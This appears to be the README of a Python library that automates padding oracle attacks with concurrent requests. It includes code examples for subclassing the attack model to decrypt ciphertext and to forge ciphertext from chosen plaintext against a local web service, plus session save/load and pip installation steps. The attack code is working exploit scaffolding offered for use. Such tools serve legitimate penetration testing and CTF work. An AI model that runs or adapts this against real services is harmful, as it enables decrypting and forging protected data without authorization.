A library for padding oracle attack concurrently
---

Payload_model is a abstract class handling all details of padding oracle attack algorithm.
You should specify a subclass of payload_model and change some import methods. You can customize it to fit different environment.

[![](https://img.shields.io/pypi/v/padding-oracle-attack.svg)](https://pypi.org/project/padding-oracle-attack/)
[![](https://img.shields.io/pypi/pyversions/padding-oracle-attack.svg)](https://pypi.org/project/padding-oracle-attack/)

Usage
---
### Get clear text from cipher text
```python
from padding_oracle_attack import payload_model
import grequests
from grequests import request

class payload(payload_model):
    def padding_ok(self, resp:Response) -> bool:
        if resp.status_code == 200:
            return True
        else:
            return False

    def recover_fake_data(self, req:Request, fake_datas):
        for fake_data in fake_datas:
            if bytes.hex(fake_data) in req.url:
                return fake_data
        return None

    def make_request(self, fake_data) -> request:
        params = {
                "data": bytes.hex(fake_data)
            }

        return request("get", "http://127.0.0.1:5000", params=params)

if __name__ == "__main__":
    m = payload("3a10f84900818b1c439430600524fb0f00000000000000000000000000000000")
    m.run()
```
![record](https://github.com/lcark/padding_oracle_attack/raw/main/media/padding_snap.GIF)

### Fake cipher text via clear text
```python
...
# some code same as the former
...
if __name__ == "__main__":
    m = payload("3a10f84900818b", fake=True)
    m.run()
```
Result
---

![result](https://github.com/lcark/padding_oracle_attack/raw/main/media/result.png)

Save and Load session
---
When breaking down the execution(CTRL-C), it will save session to file 'padding-session.txt' automaticly.You can load session like below.
```python
payload = Payload(bytes.hex(exp), fake=True)
payload.load()
payload.run()
```

Installation
---
```bash
pip install padding-oracle-attack
```